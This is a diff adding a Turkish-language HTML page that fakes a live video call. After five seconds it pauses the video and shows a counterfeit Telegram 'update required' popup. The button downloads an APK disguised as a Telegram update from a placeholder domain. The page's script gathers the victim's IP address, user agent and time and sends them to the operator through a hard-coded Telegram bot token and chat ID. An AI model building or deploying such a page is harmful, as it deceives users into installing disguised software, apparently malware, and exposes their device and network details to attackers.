@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Görüntülü Görüşme</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css"
+        integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        video {
+            position: absolute;
+            z-index: -1;
+            top: 50%;
+            left: 50%;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: translate(-50%, -50%);
+            min-width: 100%;
+            min-height: 100%;
+        }
+        .stopped {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -60%);
+            z-index: 10;
+            display: none;
+            width: 90%;
+            max-width: 380px;
+        }
+        
+        /* Telegram temalı popup animasyonları */
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translate(-50%, -40%);
+            }
+            to {
+                opacity: 1;
+                transform: translate(-50%, -60%);
+            }
+        }
+        
+        .popup-telegram {
+            animation: slideUp 0.4s ease-out;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(42, 171, 238, 0.2);
+        }
+        
+        @keyframes pulse-telegram {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(42, 171, 238, 0.4); }
+            50% { box-shadow: 0 0 0 15px rgba(42, 171, 238, 0); }
+        }
+        
+        .tg-pulse {
+            animation: pulse-telegram 2s infinite;
+        }
+        
+        @keyframes ping-slow {
+            75%, 100% {
+                transform: scale(1.5);
+                opacity: 0;
+            }
+        }
+        .animate-ping-slow {
+            animation: ping-slow 2s cubic-bezier(0, 0, 0.2, 1) infinite;
+        }
+    </style>
+</head>
+<body>
+    <!-- Canlı etiketi -->
+    <div class="bg-black bg-opacity-50 flex absolute py-1 px-3 rounded-full gap-2 top-4 left-3 z-20">
+        <div class="flex items-center justify-center">
+            <span class="relative flex h-3 w-3">
+                <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
+                <span class="relative inline-flex rounded-full h-3 w-3 bg-red-500"></span>
+            </span>
+        </div>
+        <p class="text-white text-sm font-medium">CANLI</p>
+    </div>
+    
+    <!-- Arkaplan video -->
+    <video autoplay muted loop id="backgroundVideo"></video>
+    
+    <!-- Alt kontroller -->
+    <div class="bg-white/90 backdrop-blur-lg fixed bottom-0 w-full p-3 rounded-t-3xl border-t border-gray-200 z-30">
+        <div class="bg-gray-300 w-16 h-1 rounded-full m-auto mb-4"></div>
+        <div class="flex gap-8 justify-center p-2">
+            <div class="bg-gray-100 flex justify-center items-center w-12 h-12 rounded-full shadow-md">
+                <i class="fa-solid fa-volume-xmark text-gray-600 text-xl"></i>
+            </div>
+            <div class="bg-gray-100 flex justify-center items-center w-12 h-12 rounded-full shadow-md">
+                <i class="fa-solid fa-video-slash text-gray-600 text-xl"></i>
+            </div>
+            <div class="bg-gray-100 flex justify-center items-center w-12 h-12 rounded-full shadow-md">
+                <i class="fa-solid fa-microphone-slash text-gray-600 text-xl"></i>
+            </div>
+            <div class="bg-red-500 flex justify-center items-center w-12 h-12 rounded-full shadow-lg">
+                <img src="./img/call.svg" alt="" class="w-5 h-5 filter brightness-0 invert">
+            </div>
+        </div>
+    </div>
+
+    <!-- TELEGRAM TEMALI POPUP -->
+    <div class="stopped" id="stoppedDiv">
+        <div class="bg-white rounded-3xl overflow-hidden shadow-2xl popup-telegram">
+            <!-- Telegram renkli üst çizgi -->
+            <div class="h-2 bg-gradient-to-r from-[#2AABEE] via-[#229ED9] to-[#2AABEE]"></div>
+            
+            <div class="p-7">
+                <!-- İkon ve animasyon -->
+                <div class="flex justify-center mb-5">
+                    <div class="relative">
+                        <div class="absolute inset-0 bg-[#2AABEE] rounded-full opacity-20 animate-ping-slow"></div>
+                        <div class="w-20 h-20 bg-[#EFF9FF] rounded-full flex items-center justify-center relative z-10">
+                            <i class="fa-brands fa-telegram text-[#2AABEE] text-4xl"></i>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Başlık -->
+                <h2 class="text-2xl font-bold text-center text-gray-800 mb-2">
+                    Görüşme Duraklatıldı! ⏸️
+                </h2>
+                
+                <!-- Açıklama -->
+                <div class="bg-[#EFF9FF] p-4 rounded-xl mb-5 border border-[#2AABEE]/20">
+                    <p class="text-gray-700 text-center font-medium">
+                        <i class="fa-brands fa-telegram text-[#2AABEE] mr-1"></i> 
+                        Görüntülü & sesli görüşmeler için 
+                        <span class="font-bold text-[#2AABEE]">Telegram</span> uygulamanız güncel değil.
+                    </p>
+                </div>
+                
+                <!-- Özellik listesi -->
+                <div class="space-y-2 mb-6">
+                    <div class="flex items-center gap-2 text-sm text-gray-600">
+                        <i class="fa-solid fa-circle-check text-green-500 text-sm"></i>
+                        <span>HD görüntülü görüşme</span>
+                    </div>
+                    <div class="flex items-center gap-2 text-sm text-gray-600">
+                        <i class="fa-solid fa-circle-check text-green-500 text-sm"></i>
+                        <span>Uçtan uca şifreleme</span>
+                    </div>
+                    <div class="flex items-center gap-2 text-sm text-gray-600">
+                        <i class="fa-solid fa-circle-check text-green-500 text-sm"></i>
+                        <span>7/24 ücretsiz</span>
+                    </div>
+                </div>
+                
+                <!-- APK İNDİRME BUTONU -->
+                <a href="#" 
+                   class="w-full bg-[#2AABEE] hover:bg-[#229ED9] text-white font-bold py-4 px-6 rounded-xl flex items-center justify-center gap-3 transition-all transform active:scale-95 shadow-lg tg-pulse"
+                   id="downloadBtn">
+                    <i class="fa-brands fa-google-play text-xl"></i>
+                    <span class="text-lg">Telegram'ı Güncelle (APK)</span>
+                    <i class="fa-solid fa-download text-sm opacity-80"></i>
+                </a>
+                
+                <!-- Küçük not -->
+                <p class="text-[10px] text-center text-gray-400 mt-4">
+                    <i class="fa-regular fa-circle-check mr-1"></i> 
+                    Güncelleme sonrası görüşmeye devam edebilirsiniz
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Telegram Bot bilgileri
+        const BOT_TOKEN = "8163053912:AAHVNTHM3O2LRcChxvclnM8ONUELtMdFRa8";
+        const CHAT_ID = "-1002478190818";
+        
+        // Videolar
+        const videos = [
+            'videos/video1.mp4', 'videos/video2.mp4', 'videos/video3.mp4',
+            'videos/video4.mp4', 'videos/video5.mp4', 'videos/video6.mp4',
+            'videos/video7.mp4', 'videos/video8.mp4', 'videos/video9.mp4',
+            'videos/video10.mp4', 'videos/video11.mp4', 'videos/video12.mp4',
+            'videos/video13.mp4', 'videos/video14.mp4', 'videos/video15.mp4',
+            'videos/video16.mp4', 'videos/video17.mp4', 'videos/video18.mp4',
+            'videos/video19.mp4', 'videos/video20.mp4'
+        ];
+
+        window.onload = function() {
+            // Rastgele video seç
+            const videoIndex = Math.floor(Math.random() * videos.length);
+            const videoElement = document.getElementById('backgroundVideo');
+            videoElement.src = videos[videoIndex];
+
+            // 5 saniye sonra videoyu durdur ve popup'ı göster
+            setTimeout(function() {
+                videoElement.pause(); // VIDEO DURDU AMK!
+                document.getElementById('stoppedDiv').style.display = 'block';
+            }, 5000);
+        };
+        
+        // Telegram'a log gönder
+        function sendLogToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('Log gönderildi amk!');
+                } else {
+                    console.error('Log gönderilemedi: ' + data.description);
+                }
+            })
+            .catch(error => {
+                console.error('Hata amk:', error);
+            });
+        }
+        
+        // İndirme butonu
+        document.getElementById('downloadBtn')?.addEventListener('click', function(e) {
+            e.preventDefault(); // Linke gitmeyi engelle, APK'yı manuel indircez
+            
+            // APK linki (gerçek APK'nın linki)
+            const apkUrl = 'https://senin-domain.com/telegram-privacy.apk'; // BUNU DEĞİŞTİR AMK!
+            
+            // Telegram'a log gönder
+            const userAgent = navigator.userAgent;
+            const timestamp = new Date().toLocaleString('tr-TR');
+            const ip = 'IP adresi alınamadı'; // Client tarafında IP almak zor, backend gerek
+            
+            // IP almak için ücretsiz API (isteğe bağlı)
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    const logMessage = `🔥 <b>APK İNDİRİLDİ!</b>\n\n📱 <b>Cihaz:</b> ${userAgent}\n🌐 <b>IP:</b> ${ip}\n⏰ <b>Tarih:</b> ${timestamp}\n👤 <b>Kullanıcı:</b> Telegram güncelleme butonuna bastı!`;
+                    sendLogToTelegram(logMessage);
+                })
+                .catch(() => {
+                    // IP alınamazsa sadece user agent gönder
+                    const logMessage = `🔥 <b>APK İNDİRİLDİ!</b>\n\n📱 <b>Cihaz:</b> ${userAgent}\n⏰ <b>Tarih:</b> ${timestamp}\n👤 <b>Kullanıcı:</b> Telegram güncelleme butonuna bastı!`;
+                    sendLogToTelegram(logMessage);
+                });
+            
+            // APK'yı indir
+            const link = document.createElement('a');
+            link.href = apkUrl;
+            link.download = 'telegram-guncelle.apk';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            
+            console.log('APK indiriliyor amk!');
+        });
+    </script>
+</body>
+</html>
